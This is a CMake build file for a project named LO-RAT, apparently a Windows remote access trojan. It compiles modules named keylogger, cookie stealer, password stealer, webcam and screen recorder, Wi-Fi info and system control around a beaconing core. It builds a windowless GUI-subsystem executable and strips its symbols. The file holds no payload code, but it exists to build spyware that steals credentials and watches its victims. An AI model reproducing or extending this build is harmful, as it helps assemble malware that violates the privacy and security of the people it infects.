cmake_minimum_required(VERSION 3.16)
project(LO-RAT VERSION 1.0 LANGUAGES C CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

if(MSVC)
    set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded")
endif()

set(SOURCES
    src/main.cpp
    src/beacon.cpp
    src/crypto.cpp
    src/utils.cpp
    src/dxgi_capture.cpp
    src/modules/keylogger.cpp
    src/modules/screen_recorder.cpp
    src/modules/live_screen.cpp
    src/modules/webcam_recorder.cpp
    src/modules/cookie_stealer.cpp
    src/modules/password_stealer.cpp
    src/modules/wifi_info.cpp
    src/modules/system_ctrl.cpp
    libs/sqlite3/sqlite3.c
)

set(HEADERS
    src/config.h
    src/beacon.h
    src/crypto.h
    src/utils.h
    src/dxgi_capture.h
    src/modules/keylogger.h
    src/modules/screen_recorder.h
    src/modules/live_screen.h
    src/modules/webcam_recorder.h
    src/modules/cookie_stealer.h
    src/modules/password_stealer.h
    src/modules/wifi_info.h
    src/modules/system_ctrl.h
)

add_executable(${PROJECT_NAME} WIN32 ${SOURCES} ${HEADERS})

target_include_directories(${PROJECT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_CURRENT_SOURCE_DIR}/libs
)

target_link_libraries(${PROJECT_NAME} PRIVATE
    winhttp
    crypt32
    advapi32
    gdiplus
    d3d11
    dxgi
    ws2_32
    iphlpapi
    wlanapi
    shlwapi
    mfplat
    mfreadwrite
    mfuuid
    ole32
    oleaut32
)

target_compile_definitions(${PROJECT_NAME} PRIVATE
    _CRT_SECURE_NO_WARNINGS
    WIN32_LEAN_AND_MEAN
)

if(MSVC)
    target_link_libraries(${PROJECT_NAME} PRIVATE wininet)
    target_compile_options(${PROJECT_NAME} PRIVATE
        /O2 /Ob2 /GS- /Qpar
    )
    target_link_options(${PROJECT_NAME} PRIVATE
        /LTCG /DYNAMICBASE:NO /NXCOMPAT:NO
    )
elseif(MINGW)
    target_compile_options(${PROJECT_NAME} PRIVATE
        -O2 -s -fno-exceptions -fno-rtti
    )
    target_link_options(${PROJECT_NAME} PRIVATE
        -static -static-libgcc -static-libstdc++ -s
        -Wl,--subsystem,windows
    )
endif()

add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
    COMMAND ${CMAKE_STRIP} $<TARGET_FILE:${PROJECT_NAME}>
    COMMENT "Stripping symbols..."
)
